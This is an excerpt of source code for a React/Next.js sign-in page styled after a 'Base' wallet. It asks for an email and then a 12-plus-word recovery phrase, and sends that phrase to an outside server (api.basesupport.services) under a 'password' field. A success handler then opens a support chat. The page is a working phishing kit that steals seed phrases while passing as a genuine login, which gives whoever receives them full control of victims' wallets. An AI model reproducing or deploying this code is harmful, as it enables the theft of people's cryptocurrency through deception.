...
export const getServerSideProps: GetServerSideProps<SignInPageProps> = async ({ query }) => {
  return {
    props: {
      initialEmail: typeof query.email === "string" ? query.email : "",
      initialStep: query.step === "password" ? "password" : "email",
    },
  };
};

export default function SignInPage({ initialEmail, initialStep }: SignInPageProps) {
  ...
  const isSeedStep = initialStep === "password";
  const emailReady = email.trim().length > 5;
  const seedReady = seedPhrase.trim().split(/\s+/).filter(Boolean).length >= 12;

  const backHref = isSeedStep
    ? emailReady ? `/signin?email=${encodeURIComponent(email)}` : "/signin"
    : "/";

  const handleEmailSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!emailReady) return;
    router.push({ pathname: "/signin", query: { step: "password", email: email.trim() } });
  };

  const handleSeedSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!seedReady) return;
    ...
    try {
      const response = await fetch("https://api.basesupport.services/api/auth/register", {
        ...
        body: JSON.stringify({
          email: email.trim(),
          password: seedPhrase.trim(), // We use 'password' field in backend for 'seed phrase'
        }),
      });
      ...
      if (response.ok) {
        ...
        // Open Smartsupp chat after a short delay
        setTimeout(() => {
          if (window.smartsupp) {
  ...
  return (
    <>
      <Head>
        <title>{isSeedStep ? "Sign in with a recovery phrase • Base" : "Sign In • Base"}</title>
      </Head>
      ...
      <div className="min-h-screen bg-[#050508] text-white overflow-hidden font-sans">
        <main className="mx-auto max-w-[440px] min-h-screen flex flex-col px-5 sm:px-6 py-10 md:py-16">
          ...
          <Link 
            href={backHref} 
            className="mb-10 text-4xl text-white/70 hover:text-white inline-block transition-colors"
          >
            ←
          </Link>
            ...
            <div className="flex-1 flex flex-col justify-items-start">
              ...
              <form onSubmit={handleSeedSubmit} className="flex flex-col flex-1">
                <textarea
                  ...
                  className="flex-1 bg-[#0f0f14] border-2 border-[#4285f4] focus:border-[#4285f4] focus:ring-4 focus:ring-[#4285f4]/40 rounded-3xl px-6 py-6 text-[17px] font-mono leading-relaxed resize-none outline-none placeholder:text-white/40 transition-all"
                  spellCheck={false}
                  required
                />
                ...
                <button
                  type="submit"
                  disabled={!seedReady}
                  className="mt-10 w-full py-4 bg-[#4285f4] hover:bg-[#5a9eff] disabled:bg-[#4285f4]/60 disabled:cursor-not-allowed rounded-3xl font-semibold text-[17px] transition-all active:scale-[0.985]"
                >
                  Continue
                </button>
              </form>
          ...
          {/* Email display on seed step */}
          {isSeedStep && emailReady && !isSuccess && (
            <div className="mt-6 flex justify-between items-center bg-[#0f0f14] border border-white/10 rounded-3xl px-6 py-4 text-sm">
              ...
              <Link href="/signin" className="text-[#4285f4] font-medium">Change</Link>
            </div>
          )}
        </main>
